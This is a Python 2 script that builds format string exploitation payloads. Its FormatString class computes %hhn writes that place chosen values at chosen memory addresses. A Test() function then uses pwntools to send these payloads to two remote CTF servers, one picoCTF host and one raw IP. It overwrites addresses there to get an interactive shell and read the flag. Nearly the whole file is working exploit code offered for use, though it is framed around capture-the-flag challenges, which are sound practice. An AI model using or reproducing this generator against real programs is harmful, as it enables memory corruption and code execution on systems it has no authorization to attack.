#!/usr/bin/python

from binascii import *
from struct import *
from sys import *


class FormatString:
    def __init__(self, offset=1, written='', bits=32):
        '''
            offset            ---> zero-based index of the address of the input string at the stack
            written           ---> length of written string at the start
            written_string    ---> written string at the start
            bits              ---> 64 bits or 32 bits
            bytes             ---> 8 bytes or 4 bytes
            size              ---> 2 or 1
            offset_max_length ---> maximum offset length (length of number at %<num>$n as string [will be automatically changed])
            targets           ---> dictionary of addresses and values
        '''

        try:
            offset = int(offset)
            bits = int(bits)
            written_string = str(written)
            written = len(written)
        except:
            print("[-] error at one or more inputs types")
            return None
        if version[0] != '2':
            print("[-] run/import with python2")
            return None
        elif offset < 1:
            print("[-] offset should be bigger than 0")
            return None
        elif written < 0:
            print("[-] written chars should be positive")
            return None
        elif bits != 64 and bits != 32:
            print("[-] bits should be 32 or 64")
            return None
        self.offset = offset
        self.bits = bits
        self.bytes = bits / 8
        self.size = bits / 32
        self.written = written
        self.written_string = written_string
        self.offset_max_length = 0
        self.targets = {}

    def check(self, address, value):
        '''
            check for validity of address and value
        '''

        if isinstance(address, str):
            if len(address) <= self.bytes:
                address += '\0' * (self.bytes - len(address))
                address = unpack('<' + 'I' * self.size, address)
                address = address[0] + \
                    (sum(address) - address[0]) * 0x100000000
            else:
                print("[-] address length for %d bits should be smaller than %d" %
                      (self.bits, self.bytes + 1))
                return False, 0, 0
        elif isinstance(address, (int, long)):
            if not address <= 0x100 ** self.bytes - 1:
                print("[-] address for %d bits should be smaller than %d" %
                      (self.bits, 0x100 ** self.bytes))
                return False, 0, 0
        else:
            print("[-] address should be integer or string")
            return False, 0, 0

        if isinstance(value, str):
            value = int(hexlify(value[::-1]), 16)
        elif not isinstance(value, (long, int)):
            print("[-] value should be string or integer")
            return False, 0, 0

        return True, address, value

    def add(self, address, value):
        '''
            address ---> where the value will be written
            value   ---> the written data
            * address or value can be strings or integers
        '''

        check = self.check(address, value)
        if check[0]:
            self.targets[check[1]] = check[2]
            print("[+] added address %d and value %d" % (check[1], check[2]))
            return True
        else:
            print("[-] Error at initializing address %s or value %s or both of them" %
                  (address, value))
            return False

    def print_targets(self):
        '''
            view the addresses and its values
        '''

        for address in self.targets.keys():
            value = self.targets.get(address)
            line = ''
            line += '[+] ['
            line += hex(address)
            line += ']' + ' ' * (7 + self.bytes * 2 - len(line))
            line += ' ----> '
            line += hex(value)
            print(line)

        return True

    def reset(self):
        '''
            resets the targets
        '''

        self.targets = {}

    def generate(self, end='', padding_char='.'):
        '''
            Generate the payload with specific end
            end               ---> the end char
            padding_char      ---> char used for aligning
        '''

        if len(padding_char) != 1:
            print("[-] padding char should be only one in length")
            return ''

        addresses_bytes = []
        for address in self.targets.keys():
            value = self.targets.get(address)
            value_h = hex(value)[2:].rstrip('L')
            value = unhexlify('0' * (len(value_h) % 2) + value_h)[::-1]
            offset = 0
            for bt in value:
                address_h = hex(address + offset)[2:].rstrip('L')
                b_address = unhexlify(
                    '0' * (len(address_h) % 2) + address_h)[::-1]
                b_address += '\0' * (self.bytes - len(b_address))
                addresses_bytes.append([ord(bt), b_address])
                offset += 1

        def sort(lst): return lst[0]
        addresses_bytes = sorted(addresses_bytes, key=sort)

        if len(addresses_bytes) == 0:
            print("[-] insert at least one address and its value")
            return ''

        if addresses_bytes[0][0] < self.written:
            print(
                "[-] the length of written chars should be smaller than or equal the order of the smallest byte (%d)" % addresses_bytes[0][0])
            return ''

        bytes_offsets = []
        for item in addresses_bytes:
            bytes_offsets.append(item[0] - self.written - sum(bytes_offsets))

        length = self.written
        for offset in bytes_offsets:
            if offset == 0:
                length += 5 + self.offset_max_length
            else:
                length += 7 + len(str(offset)) + self.offset_max_length

        padding = length % self.bytes
        if padding == 0:
            padding = self.bytes
        length += (self.bytes - padding)
        start = self.offset + (length / self.bytes)

        payload = self.written_string
        i = 0
        for offset in bytes_offsets:
            if len(str(start + i)) > self.offset_max_length:
                self.offset_max_length += 1
                return self.generate(end, padding_char)
            if offset == 0:
                payload += '%%%d$hhn' % (start + i)
            else:
                payload += '%%%dc%%%d$hhn' % (offset, start + i)
            i += 1

        print('[+] Generating the payload ...')

        payload += (self.bytes - padding) * padding_char
        for item in addresses_bytes:
            payload += item[1]

        payload += end

        return payload


def Test():
    print('''
        * This module is generating payloads for format string vulnerability exploitation
        * How to use:
            >>> from format_string import *
            >>> fs = FormatString(offset=7, written='foo', bits=32)
            >>> # offset is the index of the printed payload at the stack
            >>> # written is the string that will be at the start of the payload
            >>> # bits is 32 or 64
            >>> fs.add(0xf77ff000, 0x6850c031) # adding address and value pair
            >>> # also you can add data as strings
            >>> fs.add('\\x1c\\xa0\\x04\\x08', '\\x85\\x84\\x04\\x08')
            >>> # the value has no limit in length
            >>> fs.add(0x8400430, 'unlimited')
            >>> fs.print_targets()
                [+] [0xf77ff000] ----> 0x6850c031
                [+] [0x8400430]  ----> 0x646574696d696c6e75L
                [+] [0x804a01c]  ----> 0x8048485
            >>> [fs.generate()]
                [+] Generating the payload ...
                ['foo%1c%51$hhn%4c%52$hhn%41c%53$hhn%31c%54$hhn%20c%55$hhn%1c%56$hhn%3c%57$hhn%1c%58$hhn%59$hhn%3c%60$hhn%1c%61$hhn%1c%62$hhn%6c%63$hhn%1c%64$hhn%15c%65$hhn%1c%66$hhn%59c%67$hhn.\\x1e\\xa0\\x04\\x08\\x1f\\xa0\\x04\\x08\\x00\\xf0\\x7f\\xf7\\x02\\xf0\\x7f\\xf78\\x04@\\x087\\x04@\\x08\\x03\\xf0\\x7f\\xf73\\x04@\\x085\\x04@\\x082\\x04@\\x084\\x04@\\x081\\x04@\\x086\\x04@\\x080\\x04@\\x08\\x1d\\xa0\\x04\\x08\\x1c\\xa0\\x04\\x08\\x01\\xf0\\x7f\\xf7']
        * The tests here are taken from CTF challenges
        * It requires pwn library to be installed
    ''')

    try:
        import pwn
    except:
        print("[-] Cannot import pwn library (you should install it)")
        return False

    print("===========Test1===========")
    fs = FormatString(offset=7, written='pla')
    fs.add(0x804a010, 0x8048460)
    fs.add(0x804a01c, 0x80485ab)
    payload = fs.generate()
    print("Payload length is " + str(len(payload)))
    print("Payload ==>"),
    print([payload])
    p = pwn.remote('2018shell.picoctf.com', 56800)
    r = p.recv()
    p.send(payload)
    r = p.recv()
    p.send("/bin/sh")
    print("[+] enjoy the shell and do not forget to `cat flag.txt`")
    p.interactive()

    print("===========Test2===========")
    fs = FormatString(offset=11)
    fs.add(0xf77ff000, 0x6850c031)
    payload = fs.generate(end='\n')
    print("Payload length is " + str(len(payload)))
    print("Payload ==>"),
    print([payload])
    p = pwn.remote('35.184.113.140', 31339)
    r = p.recv()
    p.send(payload)
    print("[+] enjoy the shell and do not forget to `cat FLAG`")
    p.interactive()
    
    return True


if __name__ == '__main__':
    if version[0] != '2':
        print("[-] run/import with python2")
    else:
        Test()
